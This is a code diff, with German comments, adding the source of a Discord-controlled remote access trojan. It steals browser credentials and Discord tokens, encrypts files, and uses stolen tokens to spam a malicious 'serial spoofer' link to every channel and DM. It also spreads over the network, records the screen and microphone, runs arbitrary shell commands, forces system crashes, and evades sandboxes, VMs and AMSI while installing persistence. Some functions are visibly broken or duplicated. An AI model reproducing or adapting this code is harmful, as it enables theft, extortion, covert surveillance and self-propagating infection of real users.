+                                    f.write(f"[+] {success_msg}\n")
+                                if communicate_channel:
+                                    await communicate_channel.send(f"```ansi\n\033[0;32m[+] {success_msg}\033[0m\n```")
+                                await report_spreading_status(ip, success_msg)
+        with open(log_path, "a") as f:
+            f.write("[+] Enhanced network spreading completed\n")
+        if communicate_channel:
+            await communicate_channel.send(f"```ansi\n\033[0;34m[+] Enhanced network spreading completed\033[0m\n```")
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Enhanced network spreading failed: {e}\n")
+        if communicate_channel:
+            await communicate_channel.send(f"```ansi\n\033[0;31m[-] Enhanced network spreading failed: {e}\033[0m\n```")
+
+# Neue Funktion: Spreading-Status an Discord melden
+# **Einfügeort**: Füge diese Funktion direkt nach der Funktion `spread_to_network()` ein.
+async def report_spreading_status(ip, message):
+    global communicate_channel
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write(f"[+] Reporting spreading status: {message}\n")
+    try:
+        victim_id = get_victim_id()
+        guild = bot.guilds[0]
+        category = discord.utils.get(guild.categories, name="Spreading")
+        if not category:
+            category = await guild.create_category("Spreading")
+        channel = discord.utils.get(category.text_channels, name=f"spread-{ip.replace('.', '-')}")
+        if not channel:
+            channel = await guild.create_text_channel(f"spread-{ip.replace('.', '-')}", category=category)
+        await channel.send(f"```ansi\n\033[0;34m[SPREADING] {message}\033[0m\n```")
+        if communicate_channel:
+            await communicate_channel.send(f"```ansi\n\033[0;34m[SPREADING] {message}\033[0m\n```")
+        with open(log_path, "a") as f:
+            f.write(f"[+] Spreading status sent to channel spread-{ip.replace('.', '-')} and communicate channel\n")
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Failed to report spreading status: {e}\n")
+        if communicate_channel:
+            await communicate_channel.send(f"```ansi\n\033[0;31m[-] Failed to report spreading status: {e}\033[0m\n```")
+
+# Xworm payload
+async def xworm(ctx, spread_url="https://example.com/serial_spoofer.exe"):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Deploying Xworm payload\n")
+    try:
+        stolen_data, _, logins_path = steal_browser_data()
+        if stolen_data:
+            await send_stolen_data(stolen_data, ctx.channel, logins_path)
+        key = encrypt_files(os.path.join(os.path.expanduser("~"), "Public", "Documents"))
+        with open(log_path, "a") as f:
+            f.write(f"[+] Files encrypted with key: {key}\n")
+        critical_files = [os.path.join(os.path.expanduser("~"), "Public", "Documents", "test.txt")]
+        for file in critical_files:
+            try:
+                if os.path.exists(file):
+                    with open(log_path, "a") as f:
+                        f.write(f"[+] Simulated deletion of {file}\n")
+            except:
+                pass
+        discord_token = None
+        for token in stolen_data.get("tokens", []):
+            if token["platform"] in ["Discord", "Discord Canary", "Discord PTB", "Lightcord"]:
+                discord_token = token["token"]
+                break
+        if discord_token:
+            async with aiohttp.ClientSession() as session:
+                headers = {"Authorization": discord_token}
+                async with session.get("https://discord.com/api/v10/users/@me/guilds", headers=headers) as resp:
+                    if resp.status == 200:
+                        guilds = await resp.json()
+                        for guild in guilds:
+                            async with session.get(f"https://discord.com/api/v10/guilds/{guild['id']}/channels", headers=headers) as ch_resp:
+                                if ch_resp.status == 200:
+                                    channels = await ch_resp.json()
+                                    for channel in channels:
+                                        if channel["type"] == 0:
+                                            try:
+                                                async with session.post(
+                                                    f"https://discord.com/api/v10/channels/{channel['id']}/messages",
+                                                    headers=headers,
+                                                    json={"content": f"Do you want a perm serial spoofer? {spread_url}"}
+                                                ) as msg_resp:
+                                                    if msg_resp.status == 200:
+                                                        with open(log_path, "a") as f:
+                                                            f.write(f"[+] Sent message to channel {channel['id']} in guild {guild['id']}\n")
+                                            except:
+                                                pass
+                async with session.get("https://discord.com/api/v10/users/@me/channels", headers=headers) as dm_resp:
+                    if dm_resp.status == 200:
+                        dms = await dm_resp.json()
+                        for dm in dms:
+                            try:
+                                async with session.post(
+                                    f"https://discord.com/api/v10/channels/{dm['id']}/messages",
+                                    headers=headers,
+                                    json={"content": f"Do you want a perm serial spoofer? {spread_url}"}
+                                ) as msg_resp:
+                                    if msg_resp.status == 200:
+                                        with open(log_path, "a") as f:
+                                            f.write(f"[+] Sent DM to {dm['id']}\n")
+                            except:
+                                pass
+        threading.Thread(target=spread_to_network, daemon=True).start()
+        with open(log_path, "a") as f:
+            f.write("[+] Xworm payload executed\n")
+        return "[+] Xworm payload executed: Files encrypted, messages sent, network spreading initiated"
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Xworm failed: {e}\n")
+        return f"[-] Xworm failed: {e}"
+
+# Custom audio source for Discord voice streaming
+class CustomAudioSource(discord.AudioSource):
+    def __init__(self, audio_stream, frame_rate=48000, channels=2, chunk=2048):
+        self.audio_stream = audio_stream
+        self.frame_rate = frame_rate
+        self.channels = channels
+        self.chunk = chunk
+
+    def read(self):
+        try:
+            data = self.audio_stream.read(self.chunk, exception_on_overflow=False)
+            log_path = resource_path('debug.log')
+            with open(log_path, "a") as f:
+                f.write("[+] Read high-quality audio chunk for streaming\n")
+            return data
+        except Exception as e:
+            log_path = resource_path('debug.log')
+            with open(log_path, "a") as f:
+                f.write(f"[-] Audio read failed: {e}\n")
+            return b''
+
+    def is_opus(self):
+        return False  # Raw PCM data
+
+# Record screen for 30 seconds and stream live audio to voice channel
+async def record_screen_webcam(voice_channel, ctx):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Starting screen recording and live audio streaming\n")
+    try:
+        # Initialize video writer for screen recording
+        output_path = resource_path(f'recordings/screen_record_{datetime.now().strftime("%Y%m%d_%H%M%S")}.avi')
+        screen_size = (mss.mss().monitors[1]["width"], mss.mss().monitors[1]["height"])
+        fourcc = cv2.VideoWriter_fourcc(*'XVID')
+        out = cv2.VideoWriter(output_path, fourcc, 10.0, screen_size)
+        
+        # Initialize audio for streaming
+        CHUNK = 2048
+        FORMAT = pyaudio.paInt16
+        CHANNELS = 2
+        RATE = 48000  # High-quality audio
+        p = pyaudio.PyAudio()
+        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
+        
+        # Join voice channel
+        voice_client = await voice_channel.connect()
+        with open(log_path, "a") as f:
+            f.write(f"[+] Connected to voice channel {voice_channel.name}\n")
+        audio_source = CustomAudioSource(stream, frame_rate=RATE, channels=CHANNELS, chunk=CHUNK)
+        voice_client.play(audio_source)
+        
+        # Record screen for 30 seconds
+        sct = mss.mss()
+        start_time = time.time()
+        duration = 30  # seconds
+        while time.time() - start_time < duration:
+            # Capture screenshot
+            img = sct.grab(sct.monitors[1])
+            frame = np.array(Image.frombytes("RGB", img.size, img.rgb))
+            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+            out.write(frame)
+            await asyncio.sleep(0.1)  # Control frame rate
+        
+        # Clean up
+        out.release()
+        sct.close()
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+        await voice_client.disconnect()
+        with open(log_path, "a") as f:
+            f.write("[+] Voice channel disconnected and resources cleaned up\n")
+        
+        # Send screen recording to Discord
+        if os.path.exists(output_path) and os.path.getsize(output_path) < 25 * 1024 * 1024:
+            with open(output_path, 'rb') as f:
+                discord_file = discord.File(f, filename=os.path.basename(output_path))
+                await ctx.send(f"[+] Screen recording completed", file=discord_file)
+            with open(log_path, "a") as f:
+                f.write(f"[+] Screen recording saved as {output_path} and sent to Discord\n")
+        else:
+            await ctx.send("[-] Recording failed: File too large or not created")
+            with open(log_path, "a") as f:
+                f.write("[-] Recording failed: File too large or not created\n")
+        
+        return f"[+] Recording completed, sent: {os.path.basename(output_path)}"
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Recording or streaming failed: {e}\n")
+        await ctx.send(f"[-] Recording or streaming failed: {e}")
+        try:
+            if 'voice_client' in locals():
+                await voice_client.disconnect()
+        except:
+            pass
+        return f"[-] Recording or streaming failed: {e}"
+    
+        # Send file to Discord
+        if os.path.exists(output_path) and os.path.getsize(output_path) < 25 * 1024 * 1024:
+            with open(output_path, 'rb') as f:
+                discord_file = discord.File(f, filename=os.path.basename(output_path))
+                await ctx.send(f"[+] Screen recording completed", file=discord_file)
+            with open(log_path, "a") as f:
+                f.write(f"[+] Screen recording saved as {output_path} and sent to Discord\n")
+        else:
+            await ctx.send("[-] Recording failed: File too large or not created")
+            with open(log_path, "a") as f:
+                f.write("[-] Recording failed: File too large or not created\n")
+            return f"[+] Recording completed, sent: {os.path.basename(output_path)}"
+    
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Recording failed: {e}\n")
+        await ctx.send(f"[-] Recording failed: {e}")
+        return f"[-] Recording failed: {e}"
+
+def set_wallpaper(image_url):
+    """Lädt ein Bild von der URL und setzt es als Desktop-Hintergrund."""
+    try:
+        response = requests.get(image_url, timeout=10)
+        if response.status_code != 200:
+            raise Exception("Fehler beim Herunterladen des Bildes")
+        
+        image_path = os.path.expanduser("~/temp_wallpaper.jpg")
+        with open(image_path, 'wb') as f:
+            f.write(response.content)
+        
+        system = platform.system()
+        if system == "Windows":
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
+        elif system == "Linux":
+            try:
+                subprocess.run(["gsettings", "set", "org.gnome.desktop.background", "picture-uri", f"file://{image_path}"], check=True)
+            except:
+                subprocess.run(["feh", "--bg-scale", image_path], check=True)
+        elif system == "Darwin":
+            subprocess.run(["osascript", "-e", f'tell application "System Events" to set picture of every desktop to "{image_path}"'], check=True)
+        
+        f.write(f"[+] Fehler")
+        return True
+    except Exception as e:
+        f.write(f"[+] Fehler")
+        return False
+
+def trigger_crash():
+    """Löst einen Systemabsturz aus (BSOD auf Windows, Kernel Panic auf Linux/macOS)."""
+    try:
+        system = platform.system()
+        if system == "Windows":
+            # Methode 1: Erhöhen der Priorität und Terminierung eines kritischen Prozesses
+            ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
+            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, None, 6, ctypes.byref(ctypes.c_uint()))
+            f.write(f"[+] Fehler")
+        elif system == "Linux":
+            # Methode: Kernel Panic über sysrq
+            subprocess.run("echo 1 > /proc/sys/kernel/sysrq && echo c > /proc/sysrq-trigger", shell=True, check=True)
+            f.write(f"[+] Fehler")
+        elif system == "Darwin":
+            # Methode: Kernel Panic über DTrace
+            subprocess.run("sudo dtrace -w -n \"BEGIN{ panic();}\"", shell=True, check=True)
+            f.write(f"[+] Fehler")
+        return True
+    except Exception as e:
+        f.write(f"[+] Fehler")
+        return False
+
+# Parse incoming commands
+def parse_command(text):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write(f"[+] Parsing command: {text}\n")
+    text = text.lower()
+    commands = {
+        r'\bencrypt\b': "encrypt",
+        r'\bmine\b': "mine",
+        r'\bscreenshot\b': "screenshot",
+        r'\baudio\b': "audio",
+        r'\blisten\b': "listen",
+        r'\bexecute\b': "execute",
+        r'\bupload\b': "upload",
+        r'\bdownload\b': "download",
+        r'\bxworm\b': "xworm",
+        r'\barchive\b': "archive",
+        r'\bkeylog\s+start\b': "keylog_start",
+        r'\bkeylog\s+stop\b': "keylog_stop",
+        r'\bsystem\s+info\b': "system_info",
+        r'\brun\b': "run",
+        r'\brecord\b': "record",
+        r'\bwebcam\b': "webcam",
+        r'\bwallpaper\b': "wallpaper",
+        r"\bcrash\b": "crash"
+
+    }
+    for pattern, cmd in commands.items():
+        if re.search(pattern, text):
+            with open(log_path, "a") as f:
+                f.write(f"[+] Matched command: {cmd}\n")
+            return cmd
+    with open(log_path, "a") as f:
+        f.write("[-] No command matched\n")
+    return None
+
+# Define paths for browser and Discord data
+LOCAL = os.getenv("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
+ROAMING = os.getenv("APPDATA", os.path.expanduser("~\\AppData\\Roaming"))
+
+PATHS = {
+    obfuscate_string('Discord'): os.path.join(ROAMING, 'discord'),
+    obfuscate_string('Discord Canary'): os.path.join(ROAMING, 'discordcanary'),
+    obfuscate_string('Lightcord'): os.path.join(ROAMING, 'Lightcord'),
+    obfuscate_string('Discord PTB'): os.path.join(ROAMING, 'discordptb'),
+    obfuscate_string('Opera'): os.path.join(ROAMING, 'Opera Software', 'Opera Stable'),
+    obfuscate_string('Opera GX'): os.path.join(ROAMING, 'Opera Software', 'Opera GX Stable'),
+    obfuscate_string('Chrome'): os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
+    obfuscate_string('Edge'): os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
+    obfuscate_string('Brave'): os.path.join(LOCAL, 'BraveSoftware', 'Brave-Browser', 'User Data'),
+    obfuscate_string('Firefox'): os.path.join(ROAMING, 'Mozilla', 'Firefox', 'Profiles')
+}
+
+# Initialize Discord bot
+intents = discord.Intents.default()
+intents.message_content = True
+intents.members = True
+intents.voice_states = True
+intents.dm_messages = True
+bot = commands.Bot(command_prefix='/', intents=intents)
+
+# Webhook URL for fallback communication
+WEBHOOK_URL = deobfuscate_string(obfuscate_string("YOUR_DISCORD_WEBHOOK_URL"))
+
+communicate_channel = None
+
+# Bot event: On ready
+@bot.event
+async def on_ready():
+    global data_channel, communicate_channel
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write(f"[+] Bot ready: {bot.user.name}\n")
+    try:
+        victim_name = os.getlogin()
+        victim_id = get_victim_id()
+        stolen_data, _, logins_path = steal_browser_data()
+        for guild in bot.guilds:
+            category = discord.utils.get(guild.categories, name=f"{victim_name}_{victim_id}_control")
+            if not category:
+                category = await guild.create_category(f"{victim_name}_{victim_id}_control")
+            data_channel = discord.utils.get(category.text_channels, name=f"{victim_name}_{victim_id}_data")
+            if not data_channel:
+                data_channel = await guild.create_text_channel(f"{victim_name}_{victim_id}_data", category=category)
+            communicate_channel = discord.utils.get(category.text_channels, name=f"{victim_name}_{victim_id}_communicate")
+            if not communicate_channel:
+                communicate_channel = await guild.create_text_channel(f"{victim_name}_{victim_id}_communicate", category=category)
+            voice_channel = discord.utils.get(category.voice_channels, name=f"{victim_name}_{victim_id}_voice")
+            if not voice_channel:
+                voice_channel = await guild.create_voice_channel(f"{victim_name}_{victim_id}_voice", category=category)
+            if stolen_data:
+                await send_stolen_data(stolen_data, data_channel, logins_path)
+            else:
+                await data_channel.send("[-] No data stolen")
+            with open(log_path, "a") as f:
+                f.write(f"[+] Channels created/used in guild: {guild.name} for victim {victim_name}_{victim_id}\n")
+        # Asynchroner Aufruf von spread_to_network mit Fallback
+        try:
+            await spread_to_network()
+        except Exception as scan_e:
+            with open(log_path, "a") as f:
+                f.write(f"[-] Network spreading failed, continuing without: {scan_e}\n")
+            if communicate_channel:
+                await communicate_channel.send(f"```ansi\n\033[0;31m[-] Network spreading failed: {scan_e}\033[0m\n```")
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] on_ready failed: {e}\n")
+        if communicate_channel:
+            await communicate_channel.send(f"```ansi\n\033[0;31m[-] Bot initialization failed: {e}\033[0m\n```")
+
+# Bot command: Show available commands
+@bot.command()
+async def commands(ctx):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Sending command list\n")
+    commands_list = """
+    /commands - Show this help message
+    /encrypt - Encrypt victim's files
+    /mine - Start cryptominer (simulated)
+    /screenshot - Capture screenshot
+    /audio - Capture audio
+    /listen - Record screen for 30 seconds, stream high-quality live audio to voice channel
+    /execute <command> - Run shell command
+    /upload - Upload attached file to victim's PC
+    /download <filename> - Search and send file from victim's PC
+    /xworm - Deploy Xworm payload
+    /archive - Archive critical files
+    /keylog_start - Start keylogger
+    /keylog_stop - Stop keylogger and send log
+    /system_info - Get system information
+    /run <program> - Run a program
+    /webcam
+    /record
+    """
+    await ctx.send(commands_list)
+
+@bot.command()
+async def encrypt(ctx):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Executing encrypt command\n")
+    key = encrypt_files()
+    await ctx.send(f"[+] Files encrypted. Key: {key or 'None'}")
+
+@bot.command()
+async def mine(ctx):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Executing mine command\n")
+    result = start_miner()
+    await ctx.send(result or "[-] Miner failed")
+
+@bot.command()
+async def screenshot(ctx):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Executing screenshot command\n")
+    result = take_screenshot()
+    if result and os.path.exists(result):
+        await ctx.send(file=discord.File(result))
+    else:
+        await ctx.send(result or "[-] Screenshot failed")
+
+@bot.command()
+async def audio(ctx):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Executing audio command\n")
+    result = capture_audio()
+    if result and os.path.exists(result):
+        await ctx.send(file=discord.File(result))
+    else:
+        await ctx.send(result or "[-] Audio capture failed")
+
+@bot.command()
+async def listen(ctx):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Executing listen command\n")
+    try:
+        victim_id = get_victim_id()
+        voice_channel = discord.utils.get(ctx.guild.voice_channels, name=f"{os.getlogin()}_{victim_id}_voice")
+        if voice_channel:
+            result = await record_screen_webcam(voice_channel, ctx)
+            await ctx.send(result)
+        else:
+            await ctx.send("[-] Voice channel not found")
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Listen failed: {e}\n")
+        await ctx.send(f"[-] Listen failed: {e}")
+
+@bot.command()
+async def execute(ctx, *, command):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write(f"[+] Executing command: {command}\n")
+    try:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        output = result.stdout or result.stderr
+        await ctx.send(f"[+] Command output: {output[:2000]}")
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Command execution failed: {e}\n")
+        await ctx.send(f"[-] Command execution failed: {e}")
+
+@bot.command()
+async def upload(ctx):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Executing upload command\n")
+    try:
+        if not ctx.message.attachments:
+            await ctx.send("[-] No file attached")
+            return
+        attachment = ctx.message.attachments[0]
+        file_path = resource_path(f"uploaded/{attachment.filename}")
+        os.makedirs(os.path.dirname(file_path), exist_ok=True)
+        await attachment.save(file_path)
+        with open(log_path, "a") as f:
+            f.write(f"[+] Uploaded file to {file_path}\n")
+        await ctx.send(f"[+] Uploaded to {file_path}")
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Upload failed: {e}\n")
+        await ctx.send(f"[-] Upload failed: {e}")
+
+@bot.command()
+async def download(ctx, *, filename):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write(f"[+] Executing download command for {filename}\n")
+    try:
+        found = False
+        for root, _, files in os.walk("C:\\"):
+            if filename in files:
+                file_path = os.path.join(root, filename)
+                if os.path.getsize(file_path) < 25 * 1024 * 1024:
+                    await ctx.send(file=discord.File(file_path))
+                    with open(log_path, "a") as f:
+                        f.write(f"[+] Sent file: {file_path}\n")
+                    found = True
+                    break
+        if not found:
+            await ctx.send(f"[-] File '{filename}' not found or too large")
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Download failed: {e}\n")
+        await ctx.send(f"[-] Download failed: {e}")
+
+@bot.command()
+async def xworm(ctx):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Executing xworm command\n")
+    result = await xworm(ctx)
+    await ctx.send(result)
+
+@bot.command()
+async def archive(ctx):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Executing archive command\n")
+    result = archive_data()
+    if result and os.path.exists(result):
+        if os.path.getsize(result) < 25 * 1024 * 1024:
+            await ctx.send(file=discord.File(result))
+        else:
+            await ctx.send("[-] Archive too large")
+    else:
+        await ctx.send(result or "[-] Archive failed")
+
+@bot.command()
+async def system_info(ctx):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Executing system_info command\n")
+    try:
+        info = []
+        info.append(f"OS: {platform.system()} {platform.release()} ({platform.version()})")
+        info.append(f"Architecture: {platform.architecture()[0]}")
+        info.append(f"Processor: {platform.processor()}")
+        info.append(f"Memory: {psutil.virtual_memory().total / (1024**3):.2f} GB")
+        info.append(f"Username: {os.getlogin()}")
+        info.append(f"IP: {getip()}")
+        info.append(f"Hostname: {socket.gethostname()}")
+        net_if_addrs = psutil.net_if_addrs()
+        interface_count = 0
+        for iface, addrs in net_if_addrs.items():
+            if interface_count >= 3:
+                break
+            for addr in addrs:
+                if addr.family == psutil.AF_LINK:
+                    info.append(f"Interface {iface} MAC: {addr.address}")
+                elif addr.family in (2, 10):
+                    info.append(f"Interface {iface} IP: {addr.address}")
+            interface_count += 1
+        header = (
+            "```ansi\n"
+            f"\033[0;34m|══════════════════════════════|\033[0m\n"
+            f"\033[0;34m| 🌟 System Information 🌟 |\033[0m\n"
+            f"\033[0;34m|══════════════════════════════|\033[0m\n"
+        )
+        footer = f"\033[0;34m|══════════════════════════════|\033[0m\n```"
+        max_message_length = 1900
+        current_message = header
+        messages = []
+        for line in info:
+            line_formatted = f"\033[0;34m| {line}\033[0m\n"
+            if len(current_message) + len(line_formatted) + len(footer) > max_message_length:
+                messages.append(current_message + footer)
+                current_message = header
+            current_message += line_formatted
+        if current_message != header:
+            messages.append(current_message + footer)
+        for message in messages:
+            await ctx.send(message)
+        with open(log_path, "a") as f:
+            f.write("[+] System info sent\n")
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] System info failed: {e}\n")
+        await ctx.send(f"[-] System info failed: {e}")
+
+@bot.command()
+async def run(ctx, *, program):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write(f"[+] Executing run command: {program}\n")
+    try:
+        subprocess.Popen(program, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        await ctx.send(f"[+] Running {program}")
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Run failed: {e}\n")
+        await ctx.send(f"[-] Run failed: {e}")
+
+@bot.command(name='down')
+async def shutdown(ctx):
+    """Führt einen Shutdown-Befehl aus."""
+    try:
+        logging.info(f"/down-Befehl empfangen von {ctx.author}")
+        if platform.system() == "Windows":
+            os.system("shutdown /s /t 0")
+        else:
+            os.system("shutdown -h now")
+        await ctx.send("PC wird heruntergefahren.")
+        logging.info("Shutdown-Befehl ausgeführt")
+    except Exception as e:
+        logging.error(f"Fehler beim Ausführen des Shutdown-Befehls: {str(e)}")
+        await ctx.send("Fehler beim Herunterfahren des PCs.")
+
+@bot.command(name='restart')
+async def restart(ctx):
+    """Startet den PC neu."""
+    try:
+        logging.info(f"/restart-Befehl empfangen von {ctx.author}")
+        if platform.system() == "Windows":
+            os.system("shutdown /r /t 0")
+        else:
+            os.system("reboot")
+        await ctx.send("PC wird neu gestartet.")
+        logging.info("Restart-Befehl ausgeführt")
+    except Exception as e:
+        logging.error(f"Fehler beim Ausführen des Restart-Befehls: {str(e)}")
+        await ctx.send("Fehler beim Neustarten des PCs.")
+
+@bot.command(name='wallpaper')
+async def change_wallpaper(ctx, image_url):
+    """Ändert das Desktop-Hintergrundbild."""
+    try:
+        logging.info(f"/wallpaper-Befehl empfangen von {ctx.author}: {image_url}")
+        if set_wallpaper(image_url):
+            await ctx.send("Hintergrundbild wurde geändert.")
+            logging.info("Hintergrundbild erfolgreich geändert")
+        else:
+            raise Exception("Fehler beim Ändern des Hintergrundbilds")
+    except Exception as e:
+        logging.error(f"Fehler beim Ändern des Hintergrundbilds: {str(e)}")
+        await ctx.send(f"Fehler beim Ändern des Hintergrundbilds: {str(e)}")
+
+@bot.command(name='open')
+async def open_url(ctx, url):
+    """Öffnet eine URL im Standardbrowser."""
+    try:
+        logging.info(f"/open-Befehl empfangen von {ctx.author}: {url}")
+        webbrowser.open(url)
+        await ctx.send(f"URL {url} im Browser geöffnet.")
+        logging.error("Fehler beim Ändern des Hintergrundbilds: {str(e)}")
+    except Exception as e:
+        f.write(f"[-] Fehler")
+        await ctx.send(f"Fehler beim Öffnen der URL: {str(e)}")
+
+@bot.command(name='crash')
+async def crash_system(ctx):
+    """Löst einen Systemabsturz aus."""
+    try:
+        f.write(f"[-] Fehler")
+        if trigger_crash():
+            await ctx.send("Systemabsturz wird ausgelöst...")
+            f.write(f"[-] Fehler")
+        else:
+            await ctx.send("Fehler beim Auslösen des Systemabsturzes.")
+            f.write(f"[-] Fehler")
+    except Exception as e:
+        f.write(f"[-] Fehler")
+        await ctx.send(f"Fehler beim Auslösen des Systemabsturzes: {str(e)}")
+
+# Main Function
+async def main():
+    log_path = resource_path('debug.log')
+    try:
+        if not is_sandbox():
+            is_debugger_present()
+            modify_pe_header()
+            anti_heuristics()
+            delayed_execution()
+            if anti_vm_hardware():
+                with open(log_path, "a") as f:
+                    f.write("[-] VM hardware detected, exiting\n")
+                sys.exit(0)
+            self_modifying_wrapper()  # Execute critical code with self-modifying wrapper
+            patch_amsi()
+            hide_in_task_manager()
+            set_windows_icon()
+            ensure_persistence()
+            await bot.start(deobfuscate_string(obfuscate_string("MTQxMTk5NDYxNzM5NzkwNzQ2Ng.GCWIjv.8PsQtuG-88UwlFVkDPhx6rlmH_lRkujx1DrKOw")))
+        else:
+            with open(log_path, "a") as f:
+                f.write("[-] Sandbox detected, exiting\n")
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Main failed: {e}\n")
+
+# Run bot
+if platform.system() == "Emscripten":
+    asyncio.ensure_future(main())
+else:
+    if __name__ == "__main__":
+        asyncio.run(main())
